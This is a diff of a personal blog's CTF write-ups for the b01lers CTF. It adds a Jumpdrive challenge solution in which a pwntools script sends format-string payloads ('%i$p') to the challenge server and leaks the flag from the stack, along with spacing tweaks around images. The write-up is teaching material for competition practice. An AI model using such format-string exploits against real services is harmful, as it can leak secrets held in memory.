@@ -20,7 +20,7 @@ These are writeups to challenges I solved for this CTF.
 
 | Welcome Challenges    | Web     | Reverse Engineering     | Crypto    | PWN                               |
 | [Welcome](#welcome)   | [Welcome to Earth](#welcome-to-earth) | [Dank Engine](#dank-engine--100) | [Harvesting Season](#harvesting-season) | [Department of Flying Vehicles](#department-of-flying-vehicles) |
-| [Discord Flag](#discord-flag)| | [Chugga Chugga](#chugga-chugga) | |
+| [Discord Flag](#discord-flag)| | [Chugga Chugga](#chugga-chugga) | | [Jumpdrive](#jumpdrive) |
 |---
 | | | | |
 
@@ -909,7 +909,9 @@ Flag is `pctf{itwastimeforthomastogo_hehadseeneverything}`.
 
 I opened up the binary in Ghidra on OSX. Poking around the functions, we find something that looks like so:
 
+&nbsp;
 ![]({{ site.baseurl }}/img/chugga_ghidra.png)
+&nbsp;
 
 So, it looks like we have a bunch of constraints on a char\* (string) array. If we manage to match all of them, we'll have the flag.
 
@@ -950,7 +952,9 @@ Flag is `pctf{s4d_chugg4_n01zez}`
 
 We're given a single JPEG file for this one. If you open it in your favorite photo previewer, it looks legitimate:
 
+&nbsp;
 ![]({{ site.baseurl }}/img/fr3sh_h4rv3st.jpg)
+&nbsp;
 
 Furthermore, if we inspect it's heading information, is has all the correct magic bits and JFIF/EXIF headers.
 
@@ -1063,7 +1067,9 @@ b'pctf{th3_wh331s_0n_th3_tr41n_g0_r0und_4nd_r0und}'
 ## Addendum
 Instead of using Python, once we figured out the key, we could have used something like so from [Cyberchef](https://gchq.github.io/CyberChef/):
 
+&nbsp;
 ![]({{ site.baseurl }}/img/cyberchef_xor.png)
+&nbsp;
 
 
 # PWN
@@ -1116,7 +1122,13 @@ checksec dfv
 
 If we open it up in [Cutter](https://cutter.re/), we can find the `main` function. I've enabled Cutter's Decompiled (via a Ghidra plugin), Dissasembled, and Function Graph views:
 
+&nbsp;
 ![]({{ site.baseurl }}/img/dfv/cutter_main.png)
+
+_Open image in new tab for zoom in/out_
+{: style="text-align: center; font-size: 80%"}
+&nbsp;
+
 
 I've also renamed some of the local variables to be indicative of what they are.
 
@@ -1130,7 +1142,9 @@ We know [XOR is it's own inverse (still)](https://bigpick.github.io/TodayILearne
 
 Once satisfied, it continues (visible by the top most green arrow here, stemming from the initial main block):
 
+&nbsp;
 ![]({{ site.baseurl }}/img/dfv/cutter_main_pass_check.png)
+&nbsp;
 
 But wait! Now that we're here, if our input matches COOLDAV (which it had to have, for us to get to this point), it just prints hello and quits!
 
@@ -1139,7 +1153,9 @@ So, we need to satisfy the initial check to get into this block, but then also f
 We can see from the Cutter output that our input is sitting at `rbp-0x20`, and then the xor variables sit immediately after it:
 
 
+&nbsp;
 ![]({{ site.baseurl }}/img/dfv/cutter_main_def.png)
+&nbsp;
 
 Which means that we'd need to pass 16 characters from the beginning of our input to get to the `cooldav_against_xor_key`:
 
@@ -1192,3 +1208,104 @@ Flag: `pctf{sp4c3_l1n3s_R_sh0r7!}`
 payload = "a"*8 + "\00"*8 + "a"*8
 # ...
 ```
+
+## Jumpdrive
+> Dave is running away from security at the DFV. Help him reach safety
+>
+> nc pwn.ctf.b01lers.com 1002
+>
+> [53542656d8f6b156e6a8acd15cb57f49](https://storage.googleapis.com/b0ctf-deploy/jumpdrive.tgz)
+
+If we connect to that nc endpoint, we get a menu prompt, which just spits back out what we give it, then quits:
+
+```
+nc pwn.ctf.b01lers.com 1002
+Charging up the jump drive...
+Reading the destination coordinates...
+Where are we going?
+Uranus
+Uranus
+```
+
+Upon initial local exeuction, we're greeted with a Seg fault right away:
+
+```
+./jumpdrive
+Charging up the jump drive...
+Reading the destination coordinates...
+Segmentation fault
+```
+
+If we open it up in cutter, and look at main's Graph, we see:
+
+&nbsp;
+![]({{ site.baseurl }}/img/jumpdrive/jumpdrive_graph.png)
+&nbsp;
+
+So, it looks like it's probably seg faulting locally since we don't have a `flag.txt` file. If we create one locally, it runs now:
+
+```
+echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' > flag.txt
+./jumpdrive
+Charging up the jump drive...
+Reading the destination coordinates...
+Where are we going?
+Uranus
+Uranus
+```
+
+Nice.
+
+Looking back at the Cutter output, let's grok what's going on.
+
+It looks like it stores the `flag.txt` file into a stream, reading each char until it hits `0xff` (which is EOF when using fgetc). Then, it asks us where we're going (safely, using fgets), and then just print's out what we entered (using printf).
+
+*But*, look at the decompiled code:
+
+&nbsp;
+![]({{ site.baseurl }}/img/jumpdrive/decompiled_loop.png)
+&nbsp;
+
+Looks like a [printf vulnerability](http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf) to me!
+
+So, since we're streaming the flag characters to the stack, we should be able to just printf that location on the stack, and get our flag characters!
+
+This is done using the `%s` format parameter, and also syntax like `"%200$p"` which indicates to read the 200th item on the stack.
+
+We can use some guessing to try to find where our input starts on the stack (which happens to be 10th). Or, we can loop through a bunch of items until we have the whole flag printed:
+
+```python
+#!/usr/bin/env python
+from pwn import *
+
+context.bits= '64'
+context.endian= 'little'
+#context.log_level = 'debug'
+
+for i in range(1, 20):
+    conn = remote('pwn.ctf.b01lers.com', 1002)
+    conn.recvuntil("Where are we going?\n")
+    payload = f"%{i}$p"
+    conn.sendline(payload)
+    context.log_level = 'error'
+    while 1<2:
+        try:
+            print("".join(map(chr, unhex(conn.recvlineS().strip()[2:])[::-1])), end ='')
+        except EOFError as e:
+            break
+        except UnicodeDecodeError as e2:
+            continue
+print()
+```
+
+And running this, give's us:
+
+```python
+python jumpdrive_pwn.py
+[+] Opening connection to pwn.ctf.b01lers.com on port 1002: Done
+ðû³\x1c\xbd\x7fÐ¨Î\x0e@WF\x7fÀÈÂ;\x7fÀ$øKÚ\x7fhbNÿ\x1b\x00\x00ï¾­Þ`¢xÑhU6Í;NÑ\x11@pctf{pr1nTf_1z_4_St4R_m4p}
+\x00\x8e\x7f
+...
+```
+
+Look at that! Flag is `pctf{pr1nTf_1z_4_St4R_m4p}`
